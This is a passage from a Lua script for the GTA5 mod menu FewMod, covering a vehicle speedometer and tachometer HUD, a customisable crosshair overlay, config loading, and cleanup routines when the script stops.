        util.log("You Are Missing The Texture 'lowbeam.png' in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
    elseif filesystem.exists(lowbeamtexture) then
    low_beam = directx.create_texture(resources_dir .. 'lowbeam.png')
    end

    if not filesystem.exists(tpmstexture) then
        util.toast("You Are Missing The Texture 'tpms.png' in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
        util.log("You Are Missing The Texture 'tpms.png' in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
    elseif filesystem.exists(tpmstexture) then
    tpms = directx.create_texture(resources_dir .. 'tpms.png')
    end

    if not filesystem.exists(tractiontexture) then
        util.toast("You Are Missing The Texture 'traction.png' in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
        util.log("You Are Missing The Texture 'traction.png' in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
    elseif filesystem.exists(tractiontexture) then
    traction_control = directx.create_texture(resources_dir .. 'traction.png')
    end

    unit = 1
    menu.list_select(Speedometer, "Units", {"units"}, "", {"MPH", "KPH"}, 1, function(index)
        unit = index 
    end)

    speedometer_x_pos = 0.750
    menu.slider_float(Speedometer, "MPH-X", {}, "", 0, 1000, 750, 1, function(s)
        speedometer_x_pos = s * 0.001
    end)

    speedometer_y_pos = 0.800
    menu.slider_float(Speedometer, "MPY-Y", {}, "", 0, 1000, 800, 1, function(s)
        speedometer_y_pos = s * 0.001
    end)


    tachometer_x_pos = 0.870
    menu.slider_float(Speedometer, "RPM-X", {}, "", 0, 1000, 870, 1, function(s)
        tachometer_x_pos = s * 0.001
    end)

    tachometer_y_pos = 0.818
    menu.slider_float(Speedometer, "RPM-Y", {}, "", 0, 1000, 818, 1, function(s)
        tachometer_y_pos = s * 0.001
    end)

    gear_x_pos = 0.809
    menu.slider_float(Speedometer, "Gears-X", {}, "", 0, 1000, 809, 1, function(s)
        gear_x_pos = s * 0.001
    end)

    gear_y_pos = 0.870
    menu.slider_float(Speedometer, "Gears-Y", {}, "", 0, 1000, 870, 1, function(s)
        gear_y_pos = s * 0.001
    end)

    lights_x_pos = 0.710
    menu.slider_float(Speedometer, "Blinkers/Lights-X", {}, "", 0, 1000, 710, 1, function(s)
        lights_x_pos = s * 0.001
    end)

    lights_y_pos = 0.920
    menu.slider_float(Speedometer, "Blinkers/Lights-Y", {}, "", 0, 1000, 920, 1, function(s)
        lights_y_pos = s * 0.001
    end)

    menu.toggle(Speedometer, "Speedometer", {"speedmeter"}, "", function(state)
        UItoggle = state
        local lights, high_lights = memory.alloc_int(), memory.alloc_int()
        while UItoggle do 
            vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
            if vehicle ~= 0 and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then 
                local vecs = ENTITY.GET_ENTITY_SPEED_VECTOR(vehicle, true)
                local v_hdl = entities.handle_to_pointer(vehicle)
                local speed = ENTITY.GET_ENTITY_SPEED(vehicle)
                local mph = speed * 2.236936
                local kph = speed * 3.6
                local max = VEHICLE.GET_VEHICLE_ESTIMATED_MAX_SPEED(vehicle)
                local max_mph = max * 2.236936
                local max_kph = max * 3.6

                if unit == 1 then 
                    measured_speed = mph 
                    measured_max = max_mph
                else
                    measured_speed = kph 
                    measured_max = max_kph
                end
                local speed_rotation = (measured_speed/measured_max)*0.32
                if speed_rotation >= 0.75 then 
                    speed_rotation = 0.75
                end
                local rpm = entities.get_rpm(v_hdl)
                if rpm == 1 then 
                    -- rev limiter simulation
                    rpm = rpm + math.random(-2, 2)*0.01
                end
                local tach_rotation = rpm*0.45
                directx.draw_texture(speedometer_case, 0.05, 0.05, 0.5, 0.5, speedometer_x_pos, speedometer_y_pos, 0, white)
                directx.draw_texture(needle, 0.023, 0.023, 0.88, 0.125, speedometer_x_pos, speedometer_y_pos+0.015, speed_rotation, white)
                -- speed text also i guess what
                directx.draw_text(speedometer_x_pos, speedometer_y_pos+0.065, math.ceil(measured_speed), 5, 0.8, white, true)
                -- rpm gauge
                directx.draw_texture(tach_case, 0.05, 0.05, 0.5, 0.5, tachometer_x_pos, tachometer_y_pos-0.015, 0, white)
                -- rpm needle
                directx.draw_texture(needle, 0.023, 0.023, 0.88, 0.125, tachometer_x_pos, tachometer_y_pos, tach_rotation, white)
                -- rpm text
                directx.draw_text(tachometer_x_pos, tachometer_y_pos+0.05, math.ceil(rpm*6756), 5, 0.8, white, true)
                -- gear text 
                gear = entities.get_current_gear(v_hdl)
                if gear == 0 and vecs.y < 0 then
                    gear = "R"
                end
                if VEHICLE.GET_VEHICLE_ENGINE_HEALTH(vehicle) < 1000 then
                    directx.draw_texture(check_engine_light, 0.01, 0.01, 0.5, 0.5, lights_x_pos, lights_y_pos, 0, orange)
                end
                VEHICLE.GET_VEHICLE_LIGHTS_STATE(vehicle, lights, high_lights)
                if memory.read_byte(lights) == 1 then 
                    if memory.read_byte(high_lights) == 1 then 
                        directx.draw_texture(high_beam, 0.01, 0.01, 0.5, 0.5, lights_x_pos + 0.04, lights_y_pos, 0, blue)
                    else
                        directx.draw_texture(low_beam, 0.01, 0.01, 0.5, 0.5, lights_x_pos + 0.03, lights_y_pos, 0, green)
                    end
                end
                any_tires_burst = false 
                for i = 1, 4 do 
                    if VEHICLE.IS_VEHICLE_TYRE_BURST(vehicle, i, false) then 
                        any_tires_burst = true 
                    end
                end
                if any_tires_burst then 
                    directx.draw_texture(tpms, 0.01, 0.01, 0.5, 0.5, lights_x_pos + 0.08, lights_y_pos, 0, orange)
                end

                directx.draw_text(gear_x_pos, gear_y_pos, gear, 5, 1.2, white, true)
                if VEHICLE.IS_VEHICLE_IN_BURNOUT(vehicle) or math.abs(vecs.x) > 3 then 
                    directx.draw_texture(traction_control, 0.01, 0.01, 0.5, 0.5, lights_x_pos + 0.11, lights_y_pos, 0, orange)
                end
            end
            util.yield()
        end
    end)
end

::skipspeedometer::

--I Tried To Make This Make As Much Sense As Possible As I Wanted The Crosshair To Instantly Change On Path Change But I Lost About 40 Braincells Bothering With Trying To Do That

--PS: I Managed To Do So, I Was Overthinking TF Out Of It LMAO (ADHD Things)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--Custom Crosshair

local crosshairmisc = menu.list(misc, "Crosshair", {}, "")

local crosshair_file = 'cr1.png' -- default file name

local crosshair_tex = directx.create_texture(filesystem.scripts_dir().. '\\FewMod\\' .. '\\textures\\' .. '\\'..crosshair_file)

--default X position
local cr_posX = 0.5
--default Y position
local cr_posY = 0.5

--default size
local cr_size = 0.02

--Default rotation
local rotation = 0.0

GenerateFeatures = function()

    menu.divider(crosshairmisc, "Crosshair Options")
    menu.toggle_loop(crosshairmisc, "Show Crosshair", {"crshow"}, "Show Custom Crosshair",function(pog)
        cr = pog --like an on / off
        directx.draw_texture(		----Crosshair (on)
        crosshair_tex,	-- id
        cr_size,			-- sizeX
        cr_size,			-- sizeY
        0.5,				-- centerX
        0.5,				-- centerY
        cr_posX,			-- posX
        cr_posY,			-- posY
        rotation,				-- rotation
        {					-- colour
            ["r"] = 1.0,
            ["g"] = 1.0,
            ["b"] = 1.0,
            ["a"] = 1.0
        }
    )
    end)

    menu.text_input(crosshairmisc, "Change Crosshair File Name", {"crfilename"}, "The new file must be in FewMod/textures (put .png / .jpeg in the name)", function(arg)
        crosshair_file = arg
        crosshair_tex = directx.create_texture(filesystem.scripts_dir().. '\\FewMod\\' .. '\\textures\\' .. '\\'..crosshair_file)
    end, 'cr1.png')

    menu.slider(crosshairmisc, "Resize Crosshair", {"crsize"}, "", 1, 10000, 200, 1, function(size)
	    cr_size=size/10000
    end)
    menu.slider(crosshairmisc, "Crosshair X Position", {"crx"}, "", -100000, 100000, 5000, 1, function(x)
	    cr_posX=x/10000
    end)
    menu.slider(crosshairmisc, "Crosshair Y Position", {"cry"}, "", -100000, 100000, 5000, 1, function(y)
	    cr_posY=y/10000
    end)
    menu.slider(crosshairmisc, "Rotation", {"crotint"}, "", -360, 360, 0, 1, function(int)
	    rotation=int/1000
    end)
    menu.action(crosshairmisc, "Default Rotation", {}, "", function() --Default rotoation 
	    rotation = 0.0
    end)

    menu.action(crosshairmisc, "Default Crosshair", {}, "", function() --Default rotoation 
	    menu.trigger_commands("crfilename ".."cr1.png")
    end)

    menu.action(crosshairmisc, "Crosshair 2", {}, "", function() --Default rotoation 
        menu.trigger_commands("crfilename ".."cr2.png")
    end)

    menu.action(crosshairmisc, "Custom Crosshair", {}, "", function() --Default rotoation 
	    menu.trigger_commands("crfilename ".."customcr.png")
    end)

end

GenerateFeatures()

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

if filesystem.exists(FewModConfigPath) then
    util.toast("Found Config")
    util.log("Found Config")
    menu.trigger_commands("loadsconfig")
elseif not filesystem.exists(FewModConfigPath) then
    util.toast("Creating New Config")
    util.log("Creating New Config")
    menu.trigger_commands("newprofile FewMod")
end
util.toast("FewMod Loaded")
util.log("FewMod Loaded")

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

util.on_pre_stop(function()
    menu.trigger_commands("clearworld")
    util.toast("Cleaning...")
    --Incase "clearworld" above doesn't work
    ---------------------------------------------------------------------------------------
    local player_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 1)
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(player_pos.x, player_pos.y, player_pos.z, 1000000)
    menu.trigger_commands("clearropes1")
    menu.trigger_commands("clearpeds1")
    menu.trigger_commands("clearveh1")
    menu.trigger_commands("clearobj1")
    clear_area(10000)
    ----------------------------------------------------------------------------------------
end)

util.on_stop(function()
    VEHICLE.SET_VEHICLE_GRAVITY(veh, true)
    VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, false)
    ENTITY.SET_ENTITY_COLLISION(veh, true, true);
    util.toast("Cleaned, Bye <3")
end)